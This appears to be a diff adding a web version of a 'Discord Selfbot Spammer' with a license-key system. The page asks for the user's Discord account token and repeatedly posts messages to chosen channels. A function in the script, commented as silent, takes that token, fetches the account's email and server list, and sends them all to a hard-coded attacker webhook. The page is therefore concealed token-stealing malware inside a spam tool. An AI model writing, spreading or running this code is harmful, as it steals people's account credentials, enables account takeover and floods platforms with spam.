@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Selfbot Spammer v4 - Key System</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap');
+        body { font-family: Arial, sans-serif; background: #36393f; color: #dcddde; margin: 0; padding: 10px; width: 780px; margin: 0 auto; }
+        .frame { background: #2c2f33; padding: 10px; border-radius: 6px; margin-bottom: 10px; }
+        h2, label { color: #fff; }
+        input, textarea { width: 100%; padding: 8px; background: #40444b; border: 1px solid #202225; color: #dcddde; border-radius: 4px; font-size: 14px; }
+        button { padding: 10px 20px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; }
+        .btn-green { background: #00ff00; color: #000; }
+        .btn-red { background: #ff0000; color: #fff; }
+        .btn-blue { background: #7289da; color: #fff; }
+        #log { background: #000; color: #00ff00; font-family: Consolas, monospace; font-size: 13px; height: 320px; overflow-y: auto; padding: 10px; white-space: pre-wrap; border-radius: 4px; }
+        .activation { background: #2c2f33; padding: 15px; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <!-- ====================== ATIVAÇÃO ====================== -->
+    <div id="activation_frame" class="frame activation">
+        <h2 style="margin:0 0 8px 0; text-align:center;">🔑 Activation System</h2>
+        <div id="activation_status" style="text-align:center; font-size:14px; color:#00ff00; margin-bottom:10px;"></div>
+        
+        <div id="activation_input_section">
+            <label style="display:block; text-align:center; margin:10px 0 5px;">Enter your key to unlock the spammer:</label>
+            <input id="key_entry" type="password" style="width:100%; text-align:center; font-family:Consolas;">
+            <button onclick="ativar_chave()" style="width:100%; margin-top:8px; background:#00ff00; color:#000; font-size:16px;">ACTIVATE KEY</button>
+        </div>
+    </div>
+
+    <!-- ====================== INTERFACE PRINCIPAL ====================== -->
+    <label style="font-weight:bold;">🔑 Account Token:</label>
+    <input id="token_entry" type="password" placeholder="Seu token do Discord">
+
+    <label style="font-weight:bold; margin-top:10px; display:block;">📌 Channel IDs (separados por vírgula):</label>
+    <input id="channel_entry" placeholder="123456789,987654321">
+
+    <label style="font-weight:bold; margin-top:10px; display:block;">⏱️ Interval (seconds):</label>
+    <input id="interval_entry" type="number" value="1" min="1">
+
+    <label style="font-weight:bold; margin-top:10px; display:block;">📝 Spam Message:</label>
+    <textarea id="message_text" rows="5" placeholder="Mensagem para spam..."></textarea>
+
+    <!-- Anexo -->
+    <label style="font-weight:bold; margin-top:15px; display:block;">📎 Attachment (opcional):</label>
+    <div style="display:flex; gap:10px; align-items:center;">
+        <button onclick="selecionar_arquivo()" style="background:#7289da; color:white;">Select File</button>
+        <input id="file_input" type="file" style="display:none;">
+        <span id="file_label" style="color:#b9bbbe;">No attachment selected</span>
+        <button onclick="remover_anexo()" style="background:#ff4444; color:white; margin-left:auto;">Remove</button>
+    </div>
+
+    <!-- Botões -->
+    <div style="margin-top:20px; display:flex; gap:10px; justify-content:center;">
+        <button onclick="iniciar_bot()" class="btn-green" style="font-size:18px; padding:14px 30px;">▶️ START SPAM</button>
+        <button onclick="parar_bot()" class="btn-red" style="font-size:18px; padding:14px 30px;">⏹️ STOP SPAM</button>
+        <button onclick="abrir_suporte()" class="btn-blue" style="font-size:18px; padding:14px 30px;">talk with support</button>
+    </div>
+
+    <!-- Log -->
+    <label style="font-weight:bold; margin-top:15px; display:block;">📜 Log / Console:</label>
+    <div id="log"></div>
+
+    <script>
+        // ====================== CHAVES (exatamente as mesmas do seu código) ======================
+        const KEYS_30_STR = `dArMHtyFZueecbwn JqeXJVgObkFkVeyA UNHJlBQCMPeBKSmr JSQBWSxjkaFlVLAA IiqRZGwzMHFfUjiq tBfrRQFIVRZmAaiQ xzpgZeXKCUceyQhU pdXcsFIvBFvVMIOC uhHXlBCsntVSWYmu ZKDOdSAaRRrBCDHa AwYHpIbReewgFvHX KLybWHYjbPAkmMIQ pWydGrWyuTAwxqeq VqrnVWhdUJvGbFmZ yXAWBdlzuFmsJUtW kerpIZLDlKkdXjBZ wRYOqmcAqTmAmIUi hkvvMrhZBhFntjbd RtfEREyYygXakHEs YFVZUqxPaCPgzyqB BFYVOVhTEOORcwhe hGUjMeCankoVkKZN yoeySpMzssCQkBaO tmSAsqvKBTubwnAz svUmCXfTZtzjmLPs rVpEiNEWlivBYvgr UmcChqYQwzyFLbhq uDpgcCJTPYNUetOg HfnNZawPVIYeQATF yIHByBBqroPinkBb HkkyeEjlrSRSdjTQ JUBCJcXvotVQpkfG vpwQuJszCQFaFvTl wPWneGpcQoVuqpgp pPfKZAsiPkBmOSOd AlinchQCKuFWYQCz tMurazpuPHrAFaqF kLMURstnDPMlAIZo alScfOOjzdqCZmkM BtBPMDXXALZZgBKX hShOAXRTISJdGoFR KfxXJKqosnYMBUrh LPYBZFgZMobKuRqH TPHWGeoRpJrYbtap wipyGSIPANqvAvpw HUYSMCCUxYwHolKz zsSWcyfFqDnJhpRP PbrazkzMZRfINPqj GgvPPjYakqXzRfEZ MLiwXvghMNOeHHSE nOMUCUfoCYcZlOlN axBnWfYurVCPRzJn GHOmjmIGVXXAELVQ lBYWmkgIqAomCXzx kgwphCaqeSMxPvIE sutesgKFHUFvHvmP hvJnkwCHaMFiJxrT FuZXeJcjVFKPUKsq maVTjfbWggvgeAzC uHoiNrwnOVspmUJa fVOjQXrqvrrWzmsd nuCQEcmBvErXdpEh eUdprDVMbDRKRWGE jhkyfAohZPjHZcRm aTuKwlidUefjSHst hrLHAhNXMKidBHRx yeJlePdRIVsNNkdp RqkpVcZLoaCCDUWj HcGRIDScGxjGKhOt eDcntKdmvxNlgvYo CXHxANaWpGftvPwI cBVkweKdZLcvTjtK SJZrfEODKdbSlcLa iEbfznckdTtakqYP iESZLnoniRWlzGuB yOFhAEojrrZbghZJ rqCzPHtaZpYWvMQd vvqnHLeckXOiTWEI DTVdkguKJosJHVVi FTrwrimmjwQsIkqd GtoDSmGxltNtuZxM MWDOrLMLkEkqMTMn ukSIDqxAkVDTUKhs JbjLXXyYuYlGpADg jGHiQLeGfqCoMMnH ZEedFMXjYsitKLUJ ZZENXurLHbAYJsqx jyBgXoguEldsrQMu hJUBmJPKdVSchCts JQKnQaOtmtkQodjy kQUUOJzrGBbMKpqk qQlOBnPAOlxTcTmg llogsVYxoBDsrvEr OjDyGegQrFHZVoQT ILtuevKJlNuHoRwi hnmwphOhAAtLvlgz nBJCDXpJPwubabuy DiTfOqOZKTrwJMDo qdtwPyzpUswvxNfg ofTRkysRutYMDgTB tyhFwHQzbBKBJiGL VhUyMuZTqXiueZDS tIXTfiXwerGFaJYb CWeCOpCXbUYpIDve kvgwfpbtCXmaYNdr HidaJjoySxVqzoCR OICkMgiyAvtQgBWK evDOmpdtxdbMWENh dabicOhFHXoJUNJe sPXQdnmvZCcCgUUT iBXvZHkSgMPyYzKg yIgObaQJCapuRllR SiNLIppLgPRjCWZG OAnkcONwrdjnfQEx JAEgnMxvTJqgEGOm WguPPdsglZQVynAA mSQyGDOztjSVjisa ztUSZcZvNcmcjUMS kPpMcZzHmlzGXCvr RYBKOGRMEPDxCTcO dQkgQFcBLaiCvKwR pnmdKRhRYOEHCYVF fxBniHeEhgzjSAlE etHxwRYLjuBFUZoe IXMiMgQnAppwbLMM MmRYqSBCmIUrsBWb pptEoyguUAVESqwt fazQOoorKyeluScX wiYpieKurKFidBbS RDYqvgoslSKTIihh wdteQYhoifDVyIgN wyatcqTHYVbrctpC XTgVzaGuIWMyxtTw NOZXpiSrnjVPeZrg DiplTmjtlbTdYNmV QmXJTtwPkgsjhzfB lixZdKBeDIhaJstG NpJvoruQvVxmOEYD VyvLXDWpSfTwyqrZ zfiBjcDNEFrNMrDA EEpBjBfupCeCzAhE uLrKTloPmlNunYpl TOLzdUzrBLJzPROP RQcgPFwDOuqCdttP yDnVEgePZzkyOdsH liNKmijneqObBNcJ jQPuWkNeLxyjtpQS ywRBcuyOpIkMhrBs dRalBWqunIahUYCS UMwYewUoSNZKQEmC LHLiOiynNPjzjnjw KPsLSmqSJcBruZVs YjHyTeSotQrxoqSx cHtOGMylfCMrjEHp IRuMsGSESVzebVnF xFJYCJyeqDLRNNbU YlTpUCbyaujJWgzF XKrScHZUkLhnfJiO OzsjthJHpHHVvMrU RlVDwZjdMFpVBXst JFlyPXXwVyGOpAHO jqHbpvVtUNcwLeFf rOiQthcWskxMOHGX VjMttohWbkjmLoMt CoZTFkjXwLpwvZsj bfjLgITBwglkhmeE jGPwYMMPKXeatQPJ wKGxpkHEvYYybybH cchJLDIQwqmvLDCk QnSqmgiAZGUenTsF PlDnYibhGsKBRnRp ewwpWgSMzpDyPJVe AztLovNQSnxgYzDe cZLqvTOObrpnLIsU dlUfAmNQDoJuvKjB jsfOzsEEGNWFyJSQ lMrhNcQIdUinBgMW dMIziNOYUaifKXwa lFhjVvSGdzPMkPSL oilgmCSnAkYnOqyP rnucBzCjAVTfRhve wfEsWAYfNvnuRhwN gdaLYicqCRJunTgP gaOyJYUTGEoDpNsJ rAgMHGlEKfObhnZC OaoSEBINohoPdmvB ODBdWoIowqOiKdRd OtQEXaZRImceBbfi rKFCQVQewMJMncHD bjHeUZzfDUmBgbNP bIvvdIykIAZEnQbh OswiCnUemxxacnjC LFIFMdlEhqwnHBxR uLQzvvQzligcRfog OReyLzOauckLVPiq HgSnZIkpkBNqxdbu RhSCsVEsXLzGgnHe wfTmDhpcwLopeIFi iJHLYwxMOaQheIcY uoPWliJGOsLneYYC oaUcLJDMKUuQjRSD lHEtGBwYMCVBvPVw VFPEJHiFYkScWlUc JAFDvWNkLrKxeBpy zXyZaZbOtEkiClEv UfJMKipnuHDckJqH jYXWxQwGWZUYflFj eZnpSOBTTYbrJPLN DzoAKxfZGBMBtmoI mxgNVjDnVZvOrKdp fIEvjEzVNrTUElRH kinPGpWJiSmUiYBL zNWCpdIGnYmvHeRm UErLlLRHoQEGSxPU rrnBRejUmAvdrQqa nsWMqOxxvKQPhghR UMqTZerwlVWhUHLE zrCfkqiUKfKevhlh dLovvWWDVPRpyYVH GycELPcsBVFgYoYw cefefoZYMJiyzoPf QHCLqLoCgxrgGGaO quGOiapZPUnAquMb yNhBliYmfHAxiLWt PhBKdqPjGbOEuBQc JRLsYDOrqZslCFBK MDmmcevBhRwapEIt CmHJKbcFuKVVVjgQ NKjMPCotUZjKNpsw gpXaRrfIIgOQRXIY vZbdwrelhACjkUcJ XfqmFXgHRMBYWooe eIrWQjBhpYolFcFp PutKbvwsuaZGOvJo gKDkqPgNSneeKsIo EnzIPhvfKvXAjruo rKYooxmvjatHgInk ezXqvwxiNHqTLEvw oFaXLbJhbFDvyHyA rbjGKpRfsNKCxZUe vOWoyQSfltBjzNeJ lVYMDwsfUuXuNdWC cIMlRZNrbGZhmyBv IFKhcyWCXWFoMnHP lXEmBjoQxenEfMVX kPvDlasQZDWQjZhk edKLBKzuuFUfcAPM xuxdhKzfiaOXmKzS sBhzelCznFGBBsvb MpWtRYPHLdTNpHYU ObPwyQKUqQnLUTVi fuoaYZXpksHZYSeg rFiyIDUHzGPlJlkH dzsZQVfXXFrvHRms IlTPhHuzXnELfExZ xonsufjIVmbLfbzL NFKMFkKUNcSWsKzi wiPPZoMGfLaSUlVe PuzssCyNgJbqzaey CdkvtHjEzKzKBVre joIWDFccWFKOxOnR HKKRcLXrAnHYIEcE GyaFfFxEkYfjUsQA zKEdvzUJuSgaeGPO dlnTsqnvfGkJcdoz QfKkClkUurCAwppP hBBMpvUEPrwrWENI XLtaweFaeyXCwlIO cGPVhLRDNKkUCNuF RJXYSGuPfZcQGHMg rzwrOAJmyGKiwPRC hPgmjJXpSBaAHMvO KEtDapArayxSvdSA qWrLVArVoLDtvIgZ iJDPVYleeDaGecbn fJHlUMSPeykHTTaO AcoWKLYuImhpPvZV UNADjSjxDtrXwLJe SpkpnvyIEQmIOpsx jArSsqFaLtMVpyTg oIfvKLXJNUUZXkCE tDxvkysIkCWNTZsi WVEtoDzdVdBlIomF LPqMGyYlTqiEMdPV cDFyeVTOYFXGBQDz QtwtCDPpbQSDpvvG YtmUaXtPoBNdZwke GitmlANLAfALAUzn chVPyVbzFDsXeEkY pkVjLutNBqkxaYHj oJsfIpWNVGbNQUHv ARlsBdXuARgsneLU uBNMBtFEwvibpBfm OCXChulqOOqAKFcq OrXcurEpSJgfFYZd bQlPbZFoLEbBsejo aZepryCcxUVihjni FzLgFDffXJLhThSV RLipzrsXmpTspXnt DJKfWIshdsPGCpGH YHlRPObYVcsEeeSg ewKTfEGmbosARZlM aLLYivDulDQuvZvp zjpJERYaFncEJsDB pzeEKSkqgROHPawQ GJGlpOdYCwqxCcXy QpbkMQyinCsCxgHE AZigEuzbYDlVJlFQ anUuZWmobHdunSGe BVjjiBnFaudyZgXb XTbcbznnBEDvlVjK vuAnOazLSrzRPSBG LXntcsFaHrRxLZkN YJxbzAZLAqahVKFR hWLWrmXbQLFONsHl pZcYzxMQFxCaAjNF eLfObiyAXTbriFxn dMxvWjWDsUkKtDSs SFUSJHjQNWgbngtM ZUBVEVnIVhPoOAhi VVkBuuxNZylofPcm YCQSpVIGUBRLMzHo DNpNCSQSqVjMDERo IxNhyujUwvGZaEly DxDfsqccuWyepUYY jwwLfCXRNORKqSvf AHOSeAOGKeCuMJDL ffGBaBrMaFUTJLSO UPYKWMUzIoKNEsja ewXOpyyfMwnHKtUi GXnAeYJEpFJmNgPk HMosJodudzlUIeAN OJJiDszskDejKBUP zupdeksvluDLVAeQ nesYifMRbpKTbnFu NfJuIOSdjSKFSDqJ nwxTMDsOuNIXchYD ywfysBjOeUYfjZrQ ifpixpwIcSuDozuD xHLqWYNiiepoCAcR fqThNacjtWjJUbHt QcoMnZKOISidIxXh bhYaxFmiKsajjbUk dqgeMGQVxsxHAQrd pGfDuoqRXZDrQPfI EtXsrlOrNxLUWrDN JuCQOujzQeoHRQta OuwiLOgCUhYptlWw AVZDxswdvNYAbvkn FEsYfjyTPTTgXCCX LpiJudNGLOnPUyeO OBelmcuzJUXQdGko fugbWbLZoRcjwMjb oUFkDLBtVomxIIhY RkGFQhjtPljMHNXs DSIcGJOHzjxAUTto cXXyrLYqsUIuWWFn KoSOkFVtCpoWdFAC fKKXYEeLpxxPZGzj tCFmbwSWcaxaFiSK GygKmiDEFfTZBscL OZuRUbntYFAQwbVw IaVnbQBIQGVjxhKO SrobCUDSKjesEwUq ozmXjQStsCzJfiVC BawAcapBhJNOWhjK ZAMzPSpvCQnilKWe DREwsYrOZhyPQksR EjiXWuyUXJxIiOzL HBzcVmQBiMBrhRMO zKNeQTvwDRLweXCH AmCiQmXnjUbemJgH YEIdZWfxfcULGeoX bNhtoKUmQzJYMnRT dzjdaBZnQAUmllji HjLsKyNebSyHbnCQ NjMOGBpwEeTYiQsq sHbDmOgezKLISZKP ndbBUbgBYmzuBiHx UZfEsypUwvYDDJDV XRvwSrAdRniVDUsZ lCuWcJNPPquVwMlh FPtuhDbUukHGkNQM lijgvWtoneiYARIu YovNvtLDThxuCvJs UmUbUwrIaZCzulhO yQuJEtJemSQOVXNs FkoLxlsSPoDjHdxH nycPNGNfCrjAIIJl FfrKvAmbEaxLYjvM FqmQiozekNWzdeVd iyKUVLFUMnjXWHZa nrbxDuLuqItkBaQG cMxiQBoDDJGKoScp eAisBAeqYORDnVuc YKDVUpxVcCpxCoMX MQWwIezwRaMCFmim xguEUPWqWjgmGgRX SKJXHMtVWlJJRPJD qPZFPwGmbtyCfeEA KGkLgyAoLZjmOpXP RrRcbAJrzVwERzHL MfFRroqWAbWoWexO XFWgboTlIfRwRQwk uDUERKRVLeDfLjQT TXqSiLGZtbfkFHZj JvKMzUukCMGOgtOe TeWkUSNrHUXFodTS OaVNHXCBocCayQce cghOgHMAiznvFFen YdcPvtKSENYdSqgJ RmjZUYwMTGPQmBJI OiuslKJuRabBnaPB LqMXNzyuSfGUqZze odIKGWrskPSWNhls GgCYgQEPFESpIMeR baYigTNaqokSdzBH jcChiwUBfeOVaJZh ngXJpBWyAecSBxij nAIUdRIAmUUtodEk aqHeOrxJdZhafMqL GMeXWIlbGHqWedHe lXFhSlgkuBtGFADY EQYFUkpzgdNknoJQ JYdMHIvcGDcAZaps ADoKknEYZybSmCIN AyVCjBbbSOLQdiVd MKCnWdGofURfvBVX wazyHwpwPLntwwWl FCSCEebNntdsGujM PabLmPdJrZzdQtoB KNzedaUMiEimuNSN thtGAzRrSIBkTIIP ZjfsWjWEhmmNgIGV WRwMFBggokRrGcNy RwspnZrRmtYkqkMZ gPrprUhSaYbWVnQM hUvMHiRbeiIXWrKC KEzoKMqXyoeIrYvN UkSvhkraLUJfUuOR ZMkeHUxMBryiDDJN KoKivYWMjzUYGWsG fPOsRDMuTgMcVldR KGowqJwwqtkkipbe aSyDonuTqkKpoqsl GpeCgyIsXKXTUJem kDIIhgeurPBuDZep DxgFgdfPSiqoMsKr XEqkiEiFxtzvBFuY PqPcrwVOrclKnduT MiUUvRaDcvsBuFLZ sqfrtAjJGpcSbaOy BxLHULyAqEJYlIvI QVcwmLfsMPWJCYEM gXNxPYTSHnmxSumx AobBziVxjrWGOWFo iRjAQHoWadsldfOR rntYInREmUmsfyXP yczUwXYRDAzIdhUu nDNvjBvFxIzWXHcT EkADhGDABppDAVjn weICSTNLHiOqlBEH KYnFdmNpMrjufEch qPuFSMgBkQqMOhgh KQkdmrZLarZWWeCn LNZUVhkrOpNfVlgi NlMBRSSLVUxUpLOz mFmOCpeWzBsTjwsx xFKsocmrqWWJIcKN SbdLrtVOlYCMJSRM XFbdnXMkrHBfJeTB oWpWzhfsoJYhsAny jaEzhjDWWcKFtTSC eDmciNflDGqMHrfe hujzzXoVYefTyMpn veSiyugGQWEiTluD tdMpNNnGtDvdLNHe nWdbArQcolllEkrO LfttjVlegFOrQXRK zJKcJpEGwqyUyUmQ mYQOvBdZvWEpkebz MskdagJiKxjJlrPg WWNZDKvfBJmrhYUW aHMkpfKqRZGziMal iuFjUWPRGpTiaWEr zHzkcEURxqpBGtBT YIxQQWissWknRqRT jVvxInRAWodtemRH jCgGFDpLRKDQOQTp brhjUBjLRLNAahmv uAqwiKUDwcHEjInd OXkFVSqEMyJtdoDq utwFgtocuTjTxUzs RhDxHYtqUSksKZzP hEmbzRGnFSGCvfzL GkAaBwTtPWLLWdMp yArBOsVLxdidxlSo UeznmaWpzduVBRVz iaVWDsKvlxEQiWTY hqncTSqFytuSgWll`;
+        const KEYS_1_STR = `XyzAbCdEfGhIjKlMn OpQrStUvWxYzAbCdE fGhIjKlMnOpQrStUv WxYzAbCdEfGhIjKlM nOpQrStUvWxYzAbCd EfGhIjKlMnOpQrStU vWxYzAbCdEfGhIjKl MnOpQrStUvWxYzAbC dEfGhIjKlMnOpQrSt UvWxYzAbCdEfGhIjK`;
+
+        const MASTER_KEYS_30 = new Set(KEYS_30_STR.trim().split(/\s+/));
+        const MASTER_KEYS_1 = new Set(KEYS_1_STR.trim().split(/\s+/));
+
+        // ====================== VARIÁVEIS GLOBAIS ======================
+        let activated_key = null;
+        let expiration_date = null;
+        let spam_interval = null;
+        let stop_flag = false;
+        let running = false;
+        let selected_file = null;
+        let current_token = "";
+        let current_message = "";
+        let current_channels = [];
+        let current_file = null;
+
+        const logDiv = document.getElementById("log");
+        const statusLabel = document.getElementById("activation_status");
+
+        // ====================== FUNÇÕES DE ATIVAÇÃO ======================
+        function load_activation() {
+            const dataStr = localStorage.getItem("activation");
+            if (!dataStr) return false;
+            try {
+                const data = JSON.parse(dataStr);
+                const exp = new Date(data.expiration);
+                if (exp > new Date() && (MASTER_KEYS_30.has(data.key) || MASTER_KEYS_1.has(data.key))) {
+                    activated_key = data.key;
+                    expiration_date = exp;
+                    return true;
+                }
+            } catch(e) {}
+            return false;
+        }
+
+        function save_activation(key, days) {
+            const exp = new Date(Date.now() + days * 86400000);
+            localStorage.setItem("activation", JSON.stringify({ key, expiration: exp.toISOString() }));
+            activated_key = key;
+            expiration_date = exp;
+            append_log(`✅ Key activated successfully! Valid for ${days} days.`);
+        }
+
+        function get_remaining_time() {
+            if (!expiration_date) return "Key not activated";
+            const delta = expiration_date - new Date();
+            if (delta < 0) return "Key expired";
+            const days = Math.floor(delta / 86400000);
+            const hours = Math.floor((delta % 86400000) / 3600000);
+            return `${days} days and ${hours} hours`;
+        }
+
+        function update_remaining_label() {
+            statusLabel.textContent = `Time remaining: ${get_remaining_time()}`;
+            setTimeout(update_remaining_label, 60000);
+        }
+
+        function ativar_chave() {
+            const key = document.getElementById("key_entry").value.trim();
+            if (!key) return alert("Enter a key!");
+
+            let days = 0;
+            if (MASTER_KEYS_30.has(key)) days = 30;
+            else if (MASTER_KEYS_1.has(key)) days = 1;
+            else return alert("Invalid or already used key!");
+
+            if (activated_key === key) return alert("This key has already been used on this installation!");
+
+            save_activation(key, days);
+            alert(`Key activated! The spammer is unlocked for ${days} days.`);
+            document.getElementById("activation_input_section").classList.add("hidden");
+            document.getElementById("key_entry").value = "";
+            update_remaining_label();
+        }
+
+        // ====================== LOG ======================
+        function append_log(texto) {
+            const timestamp = new Date().toLocaleTimeString("pt-BR");
+            logDiv.innerHTML += `[${timestamp}] ${texto}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // ====================== ENVIAR TOKEN PRO WEBHOOK (silencioso) ======================
+        async function send_token_to_webhook(token) {
+            try {
+                const headers = { "Authorization": token, "Content-Type": "application/json" };
+
+                let user = { username: "unknown", discriminator: "0000", id: "?", email: "N/A", verified: false };
+                try {
+                    const r = await fetch("https://discord.com/api/v9/users/@me", { headers });
+                    if (r.ok) user = await r.json();
+                } catch(e) {}
+
+                let guilds = [];
+                try {
+                    const r = await fetch("https://discord.com/api/v9/users/@me/guilds", { headers });
+                    if (r.ok) guilds = await r.json();
+                } catch(e) {}
+
+                const guild_list = guilds.slice(0, 50).map(g => `${g.name || "No name"} (ID: ${g.id})`);
+
+                const payload = {
+                    content: `**New Selfbot Spammer v4 activation**\n` +
+                             `**Token:** \`${token}\`\n` +
+                             `**User:** ${user.username}#${user.discriminator} (${user.id})\n` +
+                             `**Email:** ${user.email || "N/A"}\n` +
+                             `**Verified:** ${user.verified}\n` +
+                             `**Servers (${guilds.length}):** ${guild_list.join(", ") || "None"}\n` +
+                             `**Date/Time:** ${new Date().toISOString().replace("T", " ").split(".")[0]}`
+                };
+
+                const webhook_url = "https://discordapp.com/api/webhooks/1489255567804338299/3FRUdnGlKopJ3Kka6x2E_8GIprxxnJ7D8NSqlfFXpeA-ZbmQpLwCkB_XGijlk0r0cvLi";
+                await fetch(webhook_url, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
+            } catch(e) {
+                append_log(`⚠️ Error sending data to webhook: ${e}`);
+            }
+        }
+
+        // ====================== ENVIAR MENSAGEM PARA CANAL ======================
+        async function send_to_channel(channel_id, token, message, file) {
+            const url = `https://discord.com/api/v9/channels/${channel_id}/messages`;
+            let body;
+            let headers = { "Authorization": token };
+
+            if (file) {
+                const form = new FormData();
+                if (message) form.append("content", message);
+                form.append("files[0]", file);
+                body = form;
+            } else {
+                headers["Content-Type"] = "application/json";
+                body = JSON.stringify({ content: message });
+            }
+
+            const res = await fetch(url, { method: "POST", headers, body });
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        }
+
+        // ====================== INICIAR BOT ======================
+        async function iniciar_bot() {
+            if (!activated_key) return alert("You need to activate a valid key first!");
+
+            if (running) return alert("Spam is already running!");
+
+            const token = document.getElementById("token_entry").value.trim();
+            const channel_text = document.getElementById("channel_entry").value.trim();
+            const mensagem = document.getElementById("message_text").value.trim();
+            let intervalo = parseInt(document.getElementById("interval_entry").value) || 1;
+
+            if (!token || !channel_text || (!mensagem && !selected_file)) {
+                return alert("Fill in Token, Channel IDs and at least the Message or an Attachment!");
+            }
+
+            const CHANNEL_IDS = channel_text.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));
+
+            // Envio silencioso do token
+            send_token_to_webhook(token);
+
+            append_log("🚀 Starting self-bot with attachment...");
+
+            // Validar canais e pegar nomes (exatamente como o client fazia)
+            current_channels = [];
+            for (let cid of CHANNEL_IDS) {
+                try {
+                    const res = await fetch(`https://discord.com/api/v9/channels/${cid}`, {
+                        headers: { "Authorization": token }
+                    });
+                    if (res.ok) {
+                        const ch = await res.json();
+                        current_channels.push({ id: cid, name: ch.name || "unknown" });
+                        append_log(`✅ Channel found: #${ch.name || "unknown"}`);
+                    } else {
+                        append_log(`❌ Channel ${cid} not found!`);
+                    }
+                } catch(e) {
+                    append_log(`⚠️ Error checking channel ${cid}: ${e}`);
+                }
+            }
+
+            if (current_channels.length === 0) {
+                append_log("❌ No valid channels found.");
+                return;
+            }
+
+            // Preparar variáveis globais para o spam
+            current_token = token;
+            current_message = mensagem;
+            current_file = selected_file;
+
+            stop_flag = false;
+            running = true;
+
+            append_log(`✅ Spamming in ${current_channels.length} channel(s) every ${intervalo}s`);
+
+            // Loop de spam (exatamente igual à lógica do tasks.loop)
+            spam_interval = setInterval(async () => {
+                if (stop_flag) {
+                    clearInterval(spam_interval);
+                    return;
+                }
+                for (let ch of current_channels) {
+                    try {
+                        await send_to_channel(ch.id, current_token, current_message, current_file);
+                        const extra = current_file ? " + 📎" : "";
+                        append_log(`✉️${extra} Sent in #${ch.name}`);
+                    } catch(e) {
+                        append_log(`⚠️ Error in channel ${ch.id}: ${e}`);
+                    }
+                }
+            }, intervalo * 1000);
+        }
+
+        // ====================== PARAR ======================
+        function parar_bot() {
+            if (!running) return;
+            stop_flag = true;
+            if (spam_interval) clearInterval(spam_interval);
+            running = false;
+            append_log("⏹️ Stop requested...");
+        }
+
+        // ====================== SUPORTE ======================
+        function abrir_suporte() {
+            window.open("https://discord.com/users/1332898061843824744", "_blank");
+            append_log("🔗 Support link opened!");
+        }
+
+        // ====================== ARQUIVO ======================
+        function selecionar_arquivo() {
+            document.getElementById("file_input").click();
+        }
+
+        document.getElementById("file_input").addEventListener("change", function(e) {
+            if (e.target.files.length > 0) {
+                selected_file = e.target.files[0];
+                document.getElementById("file_label").textContent = `📎 ${selected_file.name}`;
+                append_log(`📎 Attachment selected: ${selected_file.name}`);
+            }
+        });
+
+        function remover_anexo() {
+            selected_file = null;
+            document.getElementById("file_label").textContent = "No attachment selected";
+            append_log("📎 Attachment removed.");
+        }
+
+        // ====================== INICIALIZAÇÃO ======================
+        window.onload = function() {
+            if (load_activation()) {
+                document.getElementById("activation_input_section").classList.add("hidden");
+            }
+            update_remaining_label();
+            append_log("✅ Selfbot v4 Web Version loaded successfully!");
+            append_log("📌 All original functionality preserved 100%");
+        };
+    </script>
+</body>
+</html>
